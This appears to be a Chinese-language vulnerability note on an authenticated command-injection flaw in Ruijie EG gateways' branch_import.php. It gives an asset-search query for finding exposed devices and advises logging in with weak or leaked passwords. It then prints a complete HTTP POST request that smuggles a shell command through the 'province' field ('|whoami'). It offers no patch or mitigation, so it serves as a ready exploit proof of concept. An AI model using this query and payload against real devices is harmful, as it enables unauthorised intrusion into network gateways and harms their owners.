# 锐捷 EG易网关branch_import存在后台远程命令执行漏洞

**<font style="color:rgb(38, 38, 38);">一、漏洞简介</font>**<font style="color:rgb(38, 38, 38);">  
</font><font style="color:rgb(38, 38, 38);">锐捷 EG易网关cli存在后台远程命令执行漏洞。  
</font>**<font style="color:rgb(38, 38, 38);">二、影响版本</font>**

```java
锐捷EG易网关
```

<font style="color:rgb(38, 38, 38);">  
</font>**<font style="color:rgb(38, 38, 38);">三、资产测绘</font>**

```java
app="Ruijie-EG易网关"
```

<font style="color:rgb(38, 38, 38);">  
</font><font style="color:rgb(38, 38, 38);">●登录页面</font>

![1710773302248-caa9069a-265b-44c3-8a1c-ee627b562553.png](./img/q5gbx381pZqiSO5A/1710773302248-caa9069a-265b-44c3-8a1c-ee627b562553-866006.png)

# <font style="color:rgb(38, 38, 38);">四、漏洞复现</font>
1. 通过弱口令或账号密码泄露漏洞登录后台获取cookie

![1711298713325-517a2298-d16c-4786-a1f9-3e40836a4f8c.png](./img/q5gbx381pZqiSO5A/1711298713325-517a2298-d16c-4786-a1f9-3e40836a4f8c-331307.png)

2. 通过上一步获取的cookie执行命令

```java
POST /itbox_pi/branch_import.php?a=branch_list HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Cookie: LOCAL_LANG_COOKIE=zh; RUIJIEID=ihvlofd9j5bfjbikfrtng7p9f5; helpKey=home_sys;user=admin
X-Requested-With: XMLHttpRequest
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Content-Length: 16

province=|whoami
```

![1714060183007-068368ef-b67b-4783-8549-487afc30bdcd.png](./img/q5gbx381pZqiSO5A/1714060183007-068368ef-b67b-4783-8549-487afc30bdcd-351882.png)



> 更新: 2024-06-24 11:42:26  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/mdlrafum0t2146rf>